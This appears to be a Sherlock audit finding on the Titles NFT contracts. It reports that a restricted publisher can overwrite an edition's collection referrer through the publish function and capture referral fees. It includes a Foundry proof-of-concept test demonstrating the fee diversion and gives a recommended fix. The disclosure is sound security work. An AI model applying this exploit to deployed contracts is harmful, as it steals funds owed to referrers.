Rural Topaz Narwhal

high

# The Edition_Publisher can put himself as collection referrer after creation of the edition and steal the referrers profits.

## Summary

The collection referrer can be set upon creation of an Edition and she will receive a cut of all mint fees for that Edition.

A publisher (EDITION_PUBLISHER_ROLE) is, per ReadMe, a Restricted (not trusted outside of given responsibilities) role which should only allow a publisher to publish a new work in an edition for which he has been given the aforementioned role. 

Yet, whenever the publisher calls `TitlesCore:: publish` to publish a new work to an edition, he is obliged to set a  `referrer_`  which will overwrite the collection referrer set at the creation. The publish function calls  `FeeManager:: createRoute` which sets  `referrers[edition_] = referrer_` in the last line.  

As such, it is trivially easy for the publisher to replace the collection referrer with himself and steal all the fees from the original collection referrer. 

## Vulnerability Detail

The ReadMe states:
>EDITION_PUBLISHER_ROLE (Restricted) =>
  On TitlesCore, this role can:
    1) Publish a new work under any Edition for which they have been granted the role (i.e. `edition.hasAnyRole(msg.sender, EDITION_PUBLISHER_ROLE)` is true) (`publish`). After auth, the request is passed to the Edition contract for further handling.


Assume Alice has made it a business to promote Titles among creatives. She convinces Bob the artist to join and she gives him a referral link so that Bob can create a new Edition  with herself as collection referrer. All is working as it should, Bob expands his collection with new works, revenue is flowing in from mints and Alice gets her small cut. Bob wants to focus on creating new art and he appoint Hank as his publisher. 

Hank however,  is greedy and calls  `TitlesCore:: publish(edition, work_, Hank)` to replace himself as the collection referrer. Hank now receives all the profits that Alice should have gotten and will continue to do as long he remains publisher. 

The PoC below illustrates this.

Please the below code to `wallflower-contract-v2/test/TitlesCore.t.sol` and run with `forge test --match-test test_changeCollectionReferrer -vv`

```solidity 
import {Edition} from "src/editions/Edition.sol";

    function test_changeCollectionReferrer() public {


        // creating collection referrer Alice, creator Bob and publisher Hank
        address Alice = address(5000);
        address Bob = address(1200000);
        address Hank = address(666);
        vm.deal(Bob, 1 ether);
        vm.deal(Hank, 1 ether);

        // payload for edition creation
        TitlesCore.EditionPayload memory payload = TitlesCore.EditionPayload({
            work: TitlesCore.WorkPayload({
                creator: Target({target: address(Bob), chainId: block.chainid}),
                attributions: new Node[](0),
                maxSupply: 100,
                opensAt: uint64(block.timestamp),
                closesAt: uint64(block.timestamp + 3 days),
                strategy: Strategy({
                    asset: ETH_ADDRESS,
                    mintFee: 0.05 ether,
                    revshareBps: 1000,
                    royaltyBps: 250
                }),
                metadata: Metadata({label: "Werk", uri: "https://ipfs.io/{{hash}}", data: new bytes(0)})
            }),
            metadata: Metadata({label: "Edition", uri: "https://ipfs.io/{{editionHash}}", data: new bytes(0)})
        });
        bytes memory payload_ = LibZip.cdCompress(abi.encode(payload));

        vm.startPrank(address(Bob));
        // edition creation with Alice as the collection referrer
        Edition edition = titlesCore.createEdition{value: titlesCore.feeManager().getCreationFee().amount}(payload_, Alice);   
        console.log("Collection referrer on creation of the edition: %s",titlesCore.feeManager().referrers(edition));
        // output:   Collection referrer on creation of the edition: Alice == 0x0000000000000000000000000000000000001388


        // Bob grants Hank the EDITION_PUBLISHER_ROLE
        edition.grantPublisherRole(address(Hank));
        vm.stopPrank();

        vm.startPrank(address(Hank));
        // payload for publishing new work in the same collection 
        TitlesCore.WorkPayload memory workPayload = TitlesCore.WorkPayload({
            creator: Target({target: address(this), chainId: block.chainid}),
            attributions: new Node[](0),
            maxSupply: 5,
            opensAt: uint64(block.timestamp),
            closesAt: uint64(block.timestamp + 30 days),
            strategy: Strategy({
                asset: ETH_ADDRESS,
                mintFee: 0.0005 ether,
                revshareBps: 700,
                royaltyBps: 250
                }),
            metadata: Metadata({label: "Plezier", uri: "https://ipfs.io/{{hash}}", data: new bytes(0)})

        });
        bytes memory workPayload_ = LibZip.cdCompress(abi.encode(workPayload));

        // Hank publishes a new work in the collection and steals the referrer position by replacing Alice with himself.  
        titlesCore.publish{value: titlesCore.feeManager().getCreationFee().amount }(edition,workPayload_, Hank);
        
        console.log("Collection referrer after publishing a work: %s",titlesCore.feeManager().referrers(edition));
        // output: Collection referrer after publishing a work: Hank == 0x0000000000000000000000000000000000124f80
        // Hank has taken the collection referrer from Alice and now receives all the profits that she should have gotten.
        vm.stopPrank(); 

    }
```


## Impact

Per Sherlock Rules, this findings meets the criteria for IV. High finding since:
- The publisher is a RESTRICTED role which is not supposed to be able to change the fee distribution. 
- There is a definite loss of funds for the collection referrer. 
- There are no external conditions or limitations for stealing the profits.
- Changing the collection referrer is clearly against intended design. 


## Code Snippet

https://github.com/sherlock-audit/2024-04-titles/blob/main/wallflower-contract-v2/src/TitlesCore.sol#L72-L149

https://github.com/sherlock-audit/2024-04-titles/blob/main/wallflower-contract-v2/src/fees/FeeManager.sol#L120-L160

## Tool used

Manual Review + Foundry

## Recommendation

Since the collection referrer should only be set at creation of the Edition, the simplest solution is to remove  `referrers[edition_] = referrer_` from `FeeManager:: createRoute` and add it at the end of `TitlesCores::createEdition`. In this way, it becomes impossible for anyone to change the collection referrer after creation. 


